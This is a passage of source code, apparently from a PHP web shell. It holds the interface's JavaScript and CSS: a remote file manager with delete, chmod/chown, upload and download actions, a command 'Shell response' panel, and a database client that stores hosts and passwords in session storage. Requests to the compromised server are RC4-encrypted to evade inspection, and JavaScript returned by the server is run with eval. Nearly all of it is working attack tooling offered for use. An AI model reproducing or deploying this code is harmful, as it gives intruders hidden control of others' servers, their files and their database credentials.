	-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&
	(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(c=0,e=a.length-1,g=h;g;){for(g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};
	n=1;function p(a){b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(e=0;e<a.length;e++)b.call(c,a[e],e,a)});
	Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};

	function append(e, c){
		o = d.getElementById(e);
		if (o) o.innerHTML += c;
	}
	
	function prepend(e, c){
		o = d.getElementById(e);
		if (o) o.innerHTML = c + o.innerHTML;
	}

	function remove(e){
		o = d.getElementById(e);
		if (o) o.parentNode.removeChild(o);
	}

	function empty(e){
		o = d.getElementById(e);
		if (o) o.innerHTML = null;
	}
	
	function serialize(form){
		var i, j, q = [];
		if (!form || form.nodeName !== "FORM") return;
		for (i = form.elements.length - 1; i >= 0; i = i - 1){
			if (form.elements[i].name === "") continue;
			switch (form.elements[i].nodeName){
				case "INPUT":
					switch (form.elements[i].type){
						case "text":
						case "hidden":
						case "password":
						case "button":
						case "reset":
						case "submit":
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
						case "checkbox":
						case "radio":
							if (form.elements[i].checked) q.push(form.elements[i].name + "=" + euc(form.elements[i].value));				
							break;
						case "file":
							break;
					}
					break;			 
				case "TEXTAREA":
					q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
					break;
				case "SELECT":
					switch (form.elements[i].type){
						case "select-one":
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
						case "select-multiple":
							for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1){
								if (form.elements[i].options[j].selected) q.push(form.elements[i].name + "=" + euc(form.elements[i].options[j].value));
							}
							break;
					}
					break;
				case "BUTTON":
					switch (form.elements[i].type){
						case "reset":
						case "submit":
						case "button":
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
					}
					break;
			}
		}
		return q.join("&");
	}
	
	function getData(d, t){
		b = rc4Init(hash);
		if (t === "e")
			r = euc(btoa(rc4(randStr(' . $config['rc4drop'] . ') + d, b)));
		else
			r = rc4(atob(d), b).substr(' . $config['rc4drop'] . ');
		
		return r;
	}
	
	function ajax(p, cf){
		var ao = {};
		lastAjax = p;
		ao.cf = cf;
		ao.request = new XMLHttpRequest();
		ao.bindFunction = function (caller, object){
			return function (){
				return caller.apply(object, [object]);
			};
		};
		ao.stateChange = function (object){
			if (ao.request.readyState == 4) ao.cf(getData(ao.request.responseText, "d"));
		};
		if (window.XMLHttpRequest){
			req = ao.request;
			req.onreadystatechange = ao.bindFunction(ao.stateChange, ao);
			req.open("POST", targeturl, true);
			req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
			req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			req.setRequestHeader("Connection", "close");
			req.send("' . $config['consNames']['post'] . '=" + getData(p, "e"));
		}
		return ao;
	}

	function dpath(e, t){
		if (t)
			return d.getElementById("base").value + e.parentNode.parentNode.getAttribute("data-path");
		else
			return e.parentNode.parentNode.getAttribute("data-path");
	}

	//TODO removeEventListener
	function drag_start(){
		if(!onDrag){
			onDrag = true;
			//d.removeEventListener("mousemove", function(e){}, false);
			d.addEventListener("mousemove", function(e){
				dragX = e.pageX;
				dragY = e.pageY;
			}, false);
			setTimeout("drag_loop()", 50);
		}
	}

	function drag_loop(){
		if (onDrag){
			x = dragX - dragDeltaX;
			y = dragY - dragDeltaY;
			if (x < 0) x = 0;
			if (y < 0) y = 0;
			o = d.getElementById("box").style;
			o.left = x + "px";
			o.top = y + "px";
			setTimeout("drag_loop()", 50);
		}
	}

	function drag_stop(){
		onDrag = false;
		//d.removeEventListener("mousemove", function(e){}, false);
	}

	function show_box(t, ct){
		hide_box();
		box = "<div id=\'box\' class=\'box\'><p id=\'boxtitle\' class=\'boxtitle\'>"+t+"<span onclick=\'hide_box();\' class=\'boxclose floatRight\'>x</span></p><div class=\'boxcontent\'>"+ct+"</div></div>";
		append("content", box);

		x = (d.body.clientWidth - d.getElementById("box").clientWidth)/2;
		y = (d.body.clientHeight - d.getElementById("box").clientHeight)/2;
		if (x < 0) x = 0;
		if (y < 0) y = 0;
		dragX = x;
		dragY = y;
		o = d.getElementById("box").style;
		o.left = x + "px";
		o.top = y + "px";
			
		d.addEventListener("keyup", function (e){
			if (e.keyCode === 27) hide_box();
		});
		
		d.getElementById("boxtitle").addEventListener("click", function(e){
			e.preventDefault();
			if (!onDrag){		
				dragDeltaX = e.pageX - parseInt(o.left);
				dragDeltaY = e.pageY - parseInt(o.top);
				drag_start();
			} else
				drag_stop();
		}, false);

		if (d.getElementById("uival")) d.getElementById("uival").focus();
	}

	function hide_box(){
		onDrag = false;
		//d.removeEventListener("keyup", function(e){}, false);
		remove("box");
		remove("dlf");
	}

	function ajaxLoad(p){
		empty("content");
		append("content", "<div class=\'loading\'></div>");
		ajax(p, function(r){
			empty("content");
			append("content", r);
			uiUpdateControls();
			lastLoad = p;
		});
	}
	
	function uiUpdateControls(){
		o = d.getElementById("jseval");
		if (o) eval(o.value);
		o = d.getElementById("sort");
		if (o) sorttable.k(o);
		o = d.getElementById("etime");
		if (o) d.getElementById("uetime").innerHTML = o.value;
	}
	
	function viewSize(f){
		f.innerHTML = "<div class=\'loading mini\'></div>";
		ajax("me=file&md=vs&f=" + euc(dpath(f, true)), function(r){
			f.innerHTML = r;
		});
	}

	function godir(f, t){
		ajaxLoad("me=file&dir=" + euc(dpath(f, t)));
	}
	
	function godisk(f){
		ajaxLoad("me=file&dir=" + euc(f.getAttribute("data-path")));
	}
	
	function godirui(){
		ajaxLoad("me=file&dir=" + euc(d.getElementById("goui").value));
	}
	
	function showUI(a, o){
		path = dpath(o, false);
		datapath = dpath(o, true);
		disabled = "";
		text = "' . tText('name', 'Name') . '";
		btitle = "' . tText('go', 'Go!') . '";

		if (a === "del"){
			disabled = "disabled";
			title = "' . tText('del', 'Del') . '";
		} else if (a === "ren"){
			title = "' . tText('rname', 'Rename') . '";
		} else if (a === "mpers"){
			path = o.innerHTML.substring(17, 21);
			title = "' . tText('chmodchown', 'Chmod/Chown') . '";
			text = title.substring(0, 5);
		} else if (a === "mdate"){
			path = o.getAttribute("data-ft");
			title = "' . tText('date', 'Date') . '";
			text = title;
		} else if ((a === "cdir") || (a === "cfile")){
			path = "";
			datapath = d.getElementById("base").value;
			title = "' . tText('createdir', 'Create directory') . '";
			if (a === "cfile") title = "' . tText('createfile', 'Create file') . '";
		}
	
		ct = "<table class=\'boxtbl\'>" +
				"<tr><td class=\'colFit\'>" + text + "</td><td>' . mInput('uival', '" + path + "', '', '', '', '" + disabled + "') . '</td></tr>" +
				"<tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr>" +
			 "</table>";
		show_box(title, ct);
	}	
	
	function showUISec(a){
		btitle = "' . tText('go', 'Go!') . '";
		uival = "";
		n = "&quot;&quot;";
		s = serialize(d.forms[0]).replace(/chkall=&/g, "");
		s = s.substring(0, s.indexOf("&goui=")); 

		if (a === "comp"){
			title = "' . tText('download', 'Download') . '";
		} else if (a === "copy"){
			title = "' . tText('copy', 'Copy') . '";
			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td>' . mInput('uival', '') . '</td></tr>";
			n = "d.getElementById(&quot;uival&quot;).value";
		} else if (a === "rdel"){
			title = "' . tText('del', 'Del') . '";
		}

		ct = "<table class=\'boxtbl\'>" + 
				uival + 
				"<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr>" +
				"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.getElementById("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr>" +
				"</table>";
		if (a === "comp" && s.length > 2000) ct += "<div class=\'boxresult\'>WARNING the GET request is > 2000 chars</div>";
		show_box(title, ct);
	}
	
	function showFMExtras(){
		ct = "<form name=\'fmexs\'>" +
			 "<table class=\'boxtbl\'>" +
				"<tr><td class=\'colFit\'>' . tText('fmso', 'Show only') . mSelect('fm_mode', array('all' => 'All', 'file' => 'File', 'dir' => 'Dir')) . '</td><td>&nbsp;</td></tr>" +
				"<tr><td class=\'colFit\'>' . tText('fmow', 'Only writable') . mCheck('fm_onlyW', '1', '') . '</td><td>&nbsp;</td></tr>" +
				"<tr><td class=\'colFit\'>' . tText('fmrl', 'Recursive listing') . mCheck('fm_rec', '1') . '</td><td>&nbsp;</td></tr>" +
				"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'ajaxLoad(serialize(d.forms[1]));\'>' . tText('fms', 'Show') . '</span></td></tr>" +
			 "</table>" +
			 "' . mHide('me', 'file') . mHide('dir', '" + d.getElementById("base").value + "') . '" +
			 "</form>";
		
		show_box("' . tText('showfmextras', 'Show extra tools') . '", ct);
	}
	
	function processUI(a, o, n){
		' . ($config['checkBDel'] ? '
		if (a === "del" || a === "rdel")
			if (!confirm(\'' . tText('merror', 'Are you sure?') . '\')) {
				hide_box();
				return;
			}
		' : '') . '
        if (a === "comp"){
            hide_box();
            append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
        } else {
            if (a !== "rdel" && n === "") return;
            if (a !== "copy" && a !== "rdel") o = euc(o);
            if (a === "ren") n = d.getElementById("base").value + n;
           
            append("box", "<div id=\'mloading\' class=\'loading mini\'></div>");
            ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
                remove("mloading");
                if (r === "OK"){
                    hide_box();
                    ajaxLoad(lastLoad);
                } else                    
                    append("box", "<div class=\'boxresult\'>" + r + "</div>");
            });
        }
    }
	
	function dl(o){
		remove("dlf");
		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
	}
	
	function up(){
		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'>" +
				"<input type=\'hidden\' value=\'" + decodeURIComponent(getData("me=file&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'>" +
				"<table class=\'boxtbl\'>" +
					"<tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr>" +
					"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr>" +
				"</table>" +
			 "</form>";
		show_box("' . tText('upload', 'Upload') . '", ct);
	}
	
	function uiupdate(t){
		ajax(serialize(d.forms[t]), function(r){
			if (!d.getElementById("uires"))
				prepend("content", "<div id=\'uires\' class=\'uires\'></div>");

			append("uires", "' . tText('sres', 'Shell response') . ': " + r + "<br>\n");
			d.getElementById("uires").scrollIntoView();
		});
	}

	function dbexec(c){
		empty("dbRes");
		append("dbRes", "<div class=\'loading\'></div>");
		ajax(serialize(d.forms[0]) + \'&code=\' + c, function(r){
			empty("dbRes");
			append("dbRes", r);
			uiUpdateControls();
		});
	}	
	
	function dbengine(t){
		d.getElementById("su").className = "hide";
		d.getElementById("sp").className = "hide";
		d.getElementById("so").className = "hide";
		
		if ((t.value === "odbc") || (t.value === "pdo")){
			d.getElementById("sh").innerHTML = "' . tText('sq5', 'DSN/Connection String') . '";
			d.getElementById("su").className = "";
			d.getElementById("sp").className = "";
		} else if ((t.value === "sqlite") || (t.value === "sqlite3")){
			d.getElementById("sh").innerHTML = "' . tText('sq6', 'DB File') . '";
		} else {
			d.getElementById("sh").innerHTML = "' . tText('sq7', 'Host') . '";
			d.getElementById("su").className = "";
			d.getElementById("sp").className = "";
			d.getElementById("so").className = "";
		}
	}
	
	function dbhistory(a){
		if (a == "s"){
			o = {history: []};
			if (sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '") != null)
				o = JSON.parse(sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '"));
				
			o.history.push({"type": d.getElementById("type").value, "host": d.getElementById("host").value, 
				"port": d.getElementById("port").value, "user": d.getElementById("user").value, "pass": d.getElementById("pass").value});
			sessionStorage.setItem("' . $config['consNames']['sqlclog'] . '", JSON.stringify(o));
		} else if (sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '") != null) {
			s = "";
			o = JSON.parse(sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '"));
			for (i = 0; i < o.history.length; i++){
				u = "me=sql&host=" + o.history[i].host + "&port=" + o.history[i].port + "&user=" + o.history[i].user + "&pass=" + o.history[i].pass + "&type=" + o.history[i].type;
				s += "[" + o.history[i].type.toUpperCase() + "] " + o.history[i].user + "@" + o.history[i].host + "<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;" + u + "&quot;)\'>' . tText('go', 'Go!') . '</a></span><br>";
			}
			
			if (s != "") prepend("content", "<div id=\'uires\' class=\'uires\'>" + s + "</div>");
		}//TODO add delete a entry
	}

	function CheckAll(form){
		for(i = 0; i < form.elements.length; i++){
			e = form.elements[i];
			if (e.name != "chkall") e.checked = form.chkall.checked;
		}
	}
		
	function toggle(b){
		if (d.getElementById(b)){
			if (d.getElementById(b).style.display == "block") d.getElementById(b).style.display = "none";
			else d.getElementById(b).style.display = "block"
		}
	}
	
	function change(l, b){
		d.getElementById(l).style.display = "none";
		d.getElementById(b).style.display = "block";
		if (d.getElementById("goui")) d.getElementById("goui").focus();
	}
	
	function hilite(e){
		c = e.parentElement.parentElement;
		if (e.checked) 
			c.className = "mark";
		else 
			c.className = "";
		
		a = d.getElementsByName("cbox");
		b = d.getElementById("total_selected");
		c = 0;
		
		for (i = 0;i<a.length;i++) 
			if(a[i].checked) c++;
			
		if (c==0) 
			b.innerHTML = "";
		else 
			b.innerHTML = " ( selected : " + c + " items )";
	}

	ajaxLoad("me=file' . (isset($p['dir']) ? '&dir=' . rawurlencode($p['dir']) : '') . '");
	  </script>
	  <style type="text/css">
		*{
			box-sizing: border-box;
			color: #fff;
			font-family: verdana;
			text-decoration: none;
		}
		body{
			background-color: #000;
		}
		body, td, th{
			color: #d9d9d9;
			font-size: 11px;
		}
		td{
			font-size: 8pt;
			color: #ebebeb;
		}
		td.header{
			font-weight: normal;
			font-size: 10pt;
			background: #7d7474;
		}
		a{
			font-weight: normal;
			color: #dadada;
		}
		a.links{
			text-decoration: none;
		}
		a:hover{
			text-decoration: underline;
		}
		input, textarea, button, select, option{
			background-color: #800; 
			border: 0; 
			font-size: 8pt;  
			font-family: Tahoma;
			margin: 5px;
			padding: 6px;
		}
		select, option{
			padding: 3px;
		}
		p{
			margin-top: 0px;
			margin-bottom: 0px; 
			size-height: 150%
		}
		table.sortable tbody tr:hover td{
			background-color: #8080FF;
		}
		table.sortable tbody tr:nth-child(2n), .alt1{
			background-color: #7d7474;
		}
		table.sortable tbody tr:nth-child(2n+1), .alt2{
			background-color: #7d7f74;
		}
		pre{
			font: 9pt Courier, Monospace;
		} 
		.bigarea{
			height: 220px; 
			width: 100%;
		}
		.ml1{
			border:1px solid #444; 
			padding:5px;
			margin:0;
			overflow: auto;
		} 
		.notif{
			border-radius: 6px 6px 6px 6px;
			font-weight: 700;
			margin: 3px 0;
			padding: 4px 8px 4px;
		}
		.uiinfo{
			display: none;
			border: 1px solid #800000;
			border-radius: 6px 6px 6px 6px;
			margin: 4px 0;
			width: 100%;
		}
		.explore{
			width:100%;
			border-collapse:collapse;
			border-spacing:0;
		}
		.explore a{
			text-decoration:none;
		}
		.explore td{
			padding:5px 10px 5px 5px;
		}
		.explore th{
			font-weight:700;
			background-color:#222;
		}
		.explore tbody tr:hover, .mark{
			background-color:#8080FF;
		}
		.box{
			min-width:50%;
			border:1px solid #fff;
			padding:8px 8px 0 8px;
			position:fixed;
			background:#000;
			box-shadow:1px 1px 25px #150f0f;
			opacity:0.96;
		}
		.boxtitle{
			background:#7d7474;
			font-weight:bold;
			text-align:center;
			cursor: move;
			padding: 3px;
		}
		.boxtitle a, .boxtitle a:hover{
			color:#aaa;
		}
		.boxcontent{
			padding:2px 0 2px 0;
		}
		.boxresult{
			padding:4px 10px 6px 10px;
			border-top:1px solid #222;
			margin-top:4px;
			text-align:center;
		}
		.boxtbl{
			border:1px solid #222;
			border-radius:8px;
			padding-bottom:8px;
		}
		.boxtbl td{
			vertical-align:middle;
			padding:8px 15px;
			border-bottom:1px dashed #222;
		}
		.boxtbl input, .boxtbl select, .boxtbl textarea, .boxtbl, .button{
			width:100%;
		}
		.boxlabel{
			text-align: center;
			border-bottom:1px solid #222;
			padding-bottom:8px;
		}
		.boxclose{
			background:#222;
			padding:2px;
			margin-right:2px;
			padding:0 4px;
			cursor:pointer;
		}
		.button{
			min-width:120px;
			color:#fff;
			background:#800;
			border:none;
			display:block;
			text-align:center;
			/*float:left;*/
			padding: 6px;
			cursor:pointer;
		}
		.button:hover, #ulDragNDrop:hover{
			background:#820;
		}
		.floatLeft{
			text-align:left;
			float:left;
		}
		.floatRight{
			float:right;
		}
		.floatCenter{
			text-align:center;
			margin-left:auto;
			margin-right:auto;
		}
		.colFit{
			width:1px;
			white-space:nowrap;
		}
		.colSpan{
			width:100%;
		}
		.loading {
			margin-left: auto;
			margin-right: auto;
			background-color: rgba(0,0,0,0);
			border: 5px solid #800;
			opacity: .9;
			border-top: 5px solid rgba(0,0,0,0);
			border-left: 5px solid rgba(0,0,0,0);
			border-radius: 50px;
			box-shadow: 0 0 35px #800;
			width: 50px;
			height: 50px;
			margin: 0 auto;
			-moz-animation: spin .5s infinite linear;
			-webkit-animation: spin .5s infinite linear;
		}
		.mini {
			border: 2px solid #800;
			border-top: 2px solid rgba(0,0,0,0);
			border-left: 2px solid rgba(0,0,0,0);
			border-radius: 10px;
			box-shadow: 0;
			width: 15px;
			height: 15px;
		}
		@-moz-keyframes spin {
			0% {-moz-transform: rotate(0deg);}
			100% {-moz-transform: rotate(360deg);};
		}
		@-moz-keyframes spinoff {
			0% {-moz-transform: rotate(0deg);}
			100% {-moz-transform: rotate(-360deg);};
		}
		@-webkit-keyframes spin {
			0% {-webkit-transform: rotate(0deg);}
			100% {-webkit-transform: rotate(360deg);};
		}
		@-webkit-keyframes spinoff {
			0% {-webkit-transform: rotate(0deg);}
			100% {-webkit-transform: rotate(-360deg);};
		}	
		
		.hide{
			display:none;
			margin:0;
			padding:0;
		}
			
		.touch{cursor:pointer;}
		.my{color:yellow;}
		.mg{color:green;}
		.mr{color:red;}
		.mw{color:white;}
	    .table{display:table;}
		.table-caption{display:table-caption;}
		.table-row{display:table-row;}
		.table-col{display:table-cell; padding: 5px;}
		
		.stdui{
			padding:6px;
		}
		
		.uires{
			border: 1px solid #ddd; 
			padding: 15px;
			margin: 10px;
			text-align: center;
			font-weight: bold;
		}
		
		.image{
			width:16px;
			height:16px;
			cursor:pointer;
			display:block;
			float:left;
			margin-right:3px;
		}
	
		.asp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAOBAMAAADUAYG5AAAAHlBMVEX29/fX09Pk4+PKlJPAODWUBgXftbTAW1iuDw3ReXeTvAtzAAAAV0lEQVR4AWPAA1JcwMCJYUanR6dJp2UbQ4WDxbRiR8dihlLLDLd0p0nODBVqmiVFhSXBDOWpZYXJbqHBDFNDQ0NbQ0PDGISNwcCIQQkKGBQFIYABSosBAKxPGDO5nrSTAAAAAElFTkSuQmCC") no-repeat;}
		.avi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH////AwMCAgIAAAAD/AACxZc2lAAAAAXRSTlMAQObYZgAAAFRJREFUeF5FzMERwCAIRNFtgRICFGAiuUfd/msKyej4T++wAKBmBdkpIrZwlAlyQhxloVoeSXVE124jHA+p1tyBS9UYiVv7aEwEySa+/2zkOvvAvxdlbRDkNPgrwgAAAABJRU5ErkJggg==") no-repeat;}
		.cgi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH/2zL06Jebagh4d3WxiDBNS0rcsBxqIGFJAAAAAXRSTlMAQObYZgAAAGtJREFUeAFjAAJmBigwNoAyDKEM5sBgFAazsXFhsbExA4ORkpKgkJKSCYO5kKCgkGCpCQNLuKCgkmiaAwODS6GgUlgKUDWLopBimANIm6C4YhmEERYkGgBkGJWmuKqHABmmQB2hIAaLCxgDALfSD/3zyHbnAAAAAElFTkSuQmCC") no-repeat;}
		.cmd{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH///+AgIAAAADAwMAAAICAgAD//wBP2DYPAAAAAXRSTlMAQObYZgAAAENJREFUeAFjgAMlKGBQcQEDZQaVUDCAMISFhYEMiBIgQxAMwIw0QyjDPBnCECtSToSImBRDpYRBahC6lGDmGEMB3BUAQQYRh0ILDgoAAAAASUVORK5CYII=") no-repeat;}
		.copy{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHr8ffC4f6v1PF7nrqOwutWbYw/SVvnK+2gAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjgANm4xAXBzBDUFAwDMwQUgaJgRjGEDFWoWAhJcXQBAYWMEMQxAgVUlI2BDFChJSMDQvADGUUBpugiZCxaSBQJC0FwmAAigkKCgMZQLH08vIEuCsAm2MSZ1K+LZgAAAAASUVORK5CYII=") no-repeat;}
		.cpp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH///8AAIDAwMCAgIAAAACRQaxqAAAAAXRSTlMAQObYZgAAAEVJREFUeAFjYHEBAgcGBgYWQSAwgTEMHKCM0FAoQ9AUxFBSFFQEMYQUlYSUoAyYCFANXAShBqELYQ6CYQwCQAZrKBgwAACCmg2Bo41i4wAAAABJRU5ErkJggg==") no-repeat;}
		.del{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEWeAgKfHx7NlZXCf36mSUm3YGDQAADTnp94I1VJAAAABnRSTlP+8AJGi/pSC0zeAAAAcUlEQVR4Xi2J0QnCQBBERyJ+qwkW8PYK8A4swANiAXLk10DYCrz+XYIPGN7MiFTAKuL1hscXpaUXW3rVs7UxtzYpX3YmmXaquCs4IuwcUv9yKIh8cvcB2c2DT1GOjG3Q7L5FWZXca9yjmDfIKyJVsCs/V0YYHsrbmCoAAAAASUVORK5CYII=") no-repeat;}
		.dir{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXH//5zOzmOcnAAAAAD//87/zpz39/cJIMBEAAAAAXRSTlMAQObYZgAAAEtJREFUeAFjIAyYjY0doEzzUEETqKCSkpKysbEBiBkKAoEqIGagIBCIwZmJiXCmGFw0ESEqBhMFCaaBmWFiQABhKoEBiMngAgEMDABNLxCJtl4npgAAAABJRU5ErkJggg==") no-repeat;}
		.doc{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXEAAP/////AwMAAAACAgIDs+4PxAAAAAXRSTlMAQObYZgAAAFxJREFUeF4ljcENgDAMA/1hgdIFEjpB2wFI1AEQgv1XwQn3Op1kGdhecoGi5AFqoPcJZxBd6y+jT5ibmFJKqW12ipuZhJQ69zayiIsqC+dZLGDJi4MlhYSMIGQlH9rmFP/olcG8AAAAAElFTkSuQmCC") no-repeat;}
		.download{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHy+PxRf7vD3Pdyotucv+mOxGHP8pZRJPvxAAAAAXRSTlMAQObYZgAAAGlJREFUeAE1yTESQUEQhOEuxQH68UiZ3T0AQ85WuwAcQCIXub7ZxR991Q1Mb4oAzBgdjsCZrX3DllyMQJp7YNfhPqyBjUumjjSSl4Yy/EGydkiqmJyuP2R9r0yW5fMRy93T6v0KmFmW2Qe9LBLI5TPE4QAAAABJRU5ErkJggg==") no-repeat;}
		.edit{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHM4vlAesHy9fTu0HO/jEje0bNiuvgtn6IlAAAAAXRSTlMAQObYZgAAAGVJREFUeAElzcENgCAMQNHGDRoTuBI2MBIdQOCsEXQA6wQeWN+2/NNLm7QAXgKAYeasY0yIuJS9g55XYXLuoJB0ZbaYnIBCvAQmxzQKiOKhOGtFwVrS3T4BD1BgGyfgg/yWv3oNfvxKFuu6ZIarAAAAAElFTkSuQmCC") no-repeat;}
		.exe{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAOBAMAAAA/Njq6AAAAElBMVEVMaXGEhITGxsb///8AAAAAAL3QMzG6AAAAAXRSTlMAQObYZgAAADdJREFUeAFjYBSEAAEGBkYlMFB0ADJVQ0EgEMoMdnZ2BDEVIWpBTGVjEDCkDlMQbi6LCwQ4MAAAGdsU7SMxZ3cAAAAASUVORK5CYII=") no-repeat;}
		.htaccess{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH/AAD/AP8AAIAAAACAAID//wAh7q3vAAAAAXRSTlMAQObYZgAAAEhJREFUeAFjSAtggIC0QCiDNVQAyhJRhDKEjAQhDEZnRQEIQwUmJGQMFRJUdhKEyCGEVIwUIUJKzkYwIWMGqKoQByhLwIUBBgAzAQdHwl34ZQAAAABJRU5ErkJggg==") no-repeat;}
		.html{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXFIXpDA1vuEuNwumeJzc3P2+/9fl8ofnhI8AAAAAXRSTlMAQObYZgAAAHtJREFUeF41yr0Kg0AQhdGB/FhfY0idTbB3N6xtBgZsbfIEytZBwXn9uLPkqw6XS0Rh70tWTCnpnw9fv4296oxbVrWGYUr3cac+RbbCrYsyGKtJVLjNPL8YgPHQsXets4NI3bDxODfSX8oaGfBGWpfgXSEBVwDG0yc30g+Tqhs347zYeAAAAABJRU5ErkJggg==") no-repeat;}
		.info{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHW4/Gcuty90upmkL57o87x9fo/cKp6YdxCAAAAAXRSTlMAQObYZgAAAGxJREFUeAFjQAbGxhDaUFBQCEQzCyopCSqABEQVhYJBQoKhaWmhQFVMQqHCZiaKAQxMoiHOaSqBDkCGi5uIi6MDA6uQCxAARRiMQ9xSXIyAuhxNnFSczIEMFuMQV+MCkNFFgoLqEMvKy5GdAAAtjxBWRk6H0AAAAABJRU5ErkJggg==") no-repeat;}
		.ini{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMAAAACAgICAgAD//wBJC4D8AAAAAXRSTlMAQObYZgAAAERJREFUeAFjYGAWBgIGIDB0BAIDBgYWYTAAMgRBQBmFYWxojC5iDBMRCoKKqKYaQkTCzALRRISDUbUrgQCQwWAMAgYMAE/+DM0VyVW8AAAAAElFTkSuQmCC") no-repeat;}
